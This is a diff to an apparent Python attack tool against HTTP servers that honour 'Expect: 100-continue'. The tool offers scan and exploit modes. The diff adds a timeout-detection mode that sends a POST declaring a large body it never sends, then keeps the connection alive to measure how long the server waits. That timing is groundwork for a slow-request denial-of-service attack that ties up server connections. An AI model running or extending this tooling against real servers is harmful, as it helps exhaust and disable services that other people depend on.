@@ -18,6 +18,43 @@ def create_connection(host, port, use_tls=False):
         sock = context.wrap_socket(sock, server_hostname=host)
     return sock
 
+def detect_timeout(host, port, use_tls):
+    print(f"{BLUE}[*] Starting timeout detection on {host}:{port}...{RESET}")
+    try:
+        sock = create_connection(host, port, use_tls)
+        req = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Length: 100000\r\n"
+            f"Expect: 100-continue\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+        )
+        sock.sendall(req.encode())
+        _ = sock.recv(1024)
+
+        start = time.time()
+        interval = 5  # seconds
+        count = 0
+
+        while True:
+            time.sleep(interval)
+            try:
+                sock.send(b"PING\r\n")
+                count += 1
+                print(f"{YELLOW}[+] Connection alive after {count * interval} seconds.{RESET}")
+            except Exception:
+                break
+
+        duration = round(time.time() - start, 2)
+        print(f"{GREEN}[✓] Connection was held open for {duration} seconds before timeout.{RESET}")
+        try:
+            sock.shutdown(socket.SHUT_RDWR)
+        except:
+            pass
+        sock.close()
+    except Exception as e:
+        print(f"{RED}[!] Timeout detection failed: {e}{RESET}")
+
 def scan_target(host, port, use_tls, conn, wait_sec, verbose):
     print(f"{BLUE}[*] Scanning {host}:{port} with {conn} connections for {wait_sec}s each...{RESET}")
     results = []
@@ -74,14 +111,13 @@ def scan_target(host, port, use_tls, conn, wait_sec, verbose):
         print(f"{YELLOW}\n[!] Interrupted.{RESET}")
         return
 
-    # Sonuç analizi
     success = [r for r in results if r.startswith("HTTP/1.1 100")]
     total = len([r for r in results if r != "ERROR"])
 
     if total > 0 and len(success) == total:
         print(f"\n{GREEN}[✓] Vulnerable! All {total}/{total} responses returned 100 Continue.{RESET}")
     else:
-        print(f"\n{RED}[✗] Not vulnerable. {len(success)}/{total} returned 100 Continue.{RESET}")
+        print(f"\n{RED}[✗] Most Likely not vulnerable. {len(success)}/{total} returned 100 Continue.{RESET}")
 
 def exploit_connection(id, host, port, use_tls, wait_sec, verbose):
     try:
@@ -140,15 +176,18 @@ def main():
     parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
     parser.add_argument("--scan", action="store_true", help="Scan for vulnerability")
     parser.add_argument("--exploit", action="store_true", help="Exploit idle connection")
+    parser.add_argument("--timeout-detect", action="store_true", help="Detect server-side timeout duration")
 
     args = parser.parse_args()
 
-    if args.scan:
+    if args.timeout_detect:
+        detect_timeout(args.target, args.port, args.tls)
+    elif args.scan:
         scan_target(args.target, args.port, args.tls, args.conn, args.time, args.verbose)
     elif args.exploit:
         exploit_target(args.target, args.port, args.tls, args.conn, args.time, args.verbose)
     else:
-        print(f"{YELLOW}[!] Please specify either --scan or --exploit.{RESET}")
+        print(f"{YELLOW}[!] Please specify either --scan or --exploit or --timeout-detect.{RESET}")
 
 if __name__ == "__main__":
     main()
